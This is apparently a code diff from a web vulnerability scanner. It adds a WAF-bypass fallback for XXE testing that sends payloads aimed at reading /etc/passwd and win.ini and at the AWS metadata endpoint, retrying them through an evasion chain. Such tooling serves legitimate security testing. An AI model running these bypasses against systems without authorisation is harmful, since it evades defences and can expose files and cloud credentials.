@@ -269,6 +269,18 @@ def scan_xxe(url, delay=0):
             )
             log_warning(f"[MEDIUM] XML parser errors at: {ep_url}")
 
+    # ── 3-tier WAF bypass chain (AI evolution + protocol evasion) ──
+    # Conservative fallback before delegating to ai_exploit_agent: only fires
+    # when the main scan triggered a specific-WAF fingerprint. Tier 1
+    # (auto-tamper) is disabled here because TamperChain operates on
+    # SQL/XSS-shaped tokens — applying it to a multi-line XML body with
+    # DOCTYPE and ENTITY declarations corrupts the document before it
+    # reaches the parser.
+    if not findings and xml_endpoints:
+        bypass_finding = _run_waf_bypass_chain_for_xxe(xml_endpoints, delay)
+        if bypass_finding:
+            findings.append(bypass_finding)
+
     # ── AI Exploit Agent (Final Escalation) ──
     if not findings and xml_endpoints:
         try:
@@ -313,6 +325,111 @@ def scan_xxe(url, delay=0):
 
     log_success(f"XXE scan complete. Found {len(findings)} issue(s).")
     return findings
+
+
+def _run_waf_bypass_chain_for_xxe(xml_endpoints, delay):
+    """3-tier WAF bypass for XXE (Tier 1 disabled — XML body would break).
+
+    Iterates the first 3 XML-accepting endpoints, attempting three
+    representative XXE payload kinds (Linux file read, Windows file read,
+    AWS metadata SSRF). Returns the first finding or None.
+
+    Activates only when ``waf_detector.detected_waf`` is non-empty.
+    """
+    from utils.waf import waf_detector
+
+    waf_name = getattr(waf_detector, "detected_waf", "") or ""
+    if not waf_name:
+        return None
+
+    from utils.waf_evasion import apply_waf_bypass_chain
+
+    # (xml_body, kind_label, signature_list, payload_label)
+    seed_set = (
+        (XXE_FILE_READ, "linux-file-read", LINUX_SIGNATURES, "file:///etc/passwd"),
+        (
+            XXE_FILE_READ_WIN,
+            "windows-file-read",
+            WINDOWS_SIGNATURES,
+            "file:///c:/windows/win.ini",
+        ),
+        (XXE_SSRF, "aws-metadata-ssrf", AWS_SIGNATURES, "http://169.254.169.254/..."),
+    )
+
+    log_info(f"⚡ XXE: 2-tier WAF bypass attempt against {waf_name}")
+
+    for ep in xml_endpoints[:3]:
+        ep_url = ep["url"]
+        for body_payload, kind, sigs, payload_label in seed_set:
+            case_is_windows = kind == "windows-file-read"
+
+            def request_fn(p, *, evasion_level=0):
+                try:
+                    return smart_request(
+                        "post",
+                        ep_url,
+                        data=p,
+                        headers={
+                            "Content-Type": "application/xml",
+                            "Accept": "*/*",
+                        },
+                        delay=delay,
+                        timeout=10,
+                        evasion_level=evasion_level,
+                    )
+                except ScanExceptions:
+                    return None
+
+            def check_fn(response, p, source):
+                if response is None:
+                    return None
+                body = getattr(response, "text", "") or ""
+                if not body:
+                    return None
+                # Windows .ini signatures use bracketed section names — match
+                # case-insensitively to tolerate response casing changes.
+                haystack = body.lower() if case_is_windows else body
+                for sig in sigs:
+                    needle = sig.lower() if case_is_windows else sig
+                    if needle in haystack:
+                        log_success(
+                            f"[CRITICAL] XXE via WAF bypass at {ep_url} "
+                            f"({source})"
+                        )
+                        return {
+                            "type": "XXE",
+                            "kind": kind,
+                            "url": ep_url,
+                            "payload": payload_label,
+                            "evidence": f"Response contains '{sig}'",
+                            "severity": "CRITICAL",
+                            "description": (
+                                f"XXE confirmed at {ep_url} via WAF bypass "
+                                f"chain ({source}). WAF: {waf_name}"
+                            ),
+                            "source": f"WAF Bypass Chain ({source})",
+                            "waf": waf_name,
+                        }
+                return None
+
+            seed_resp = request_fn(body_payload)
+            if seed_resp is None:
+                continue
+
+            finding = apply_waf_bypass_chain(
+                payload=body_payload,
+                blocked_response=seed_resp,
+                request_fn=request_fn,
+                check_fn=check_fn,
+                waf_name=waf_name,
+                vuln_label="XXE",
+                # XML body must reach the parser intact — auto-tamper would
+                # rewrite control chars and break the DOCTYPE/ENTITY decls.
+                enable_tamper=False,
+            )
+            if finding:
+                return finding
+    return None
 
 
 # ── Async version ─────────────────────────────────────────────────────────
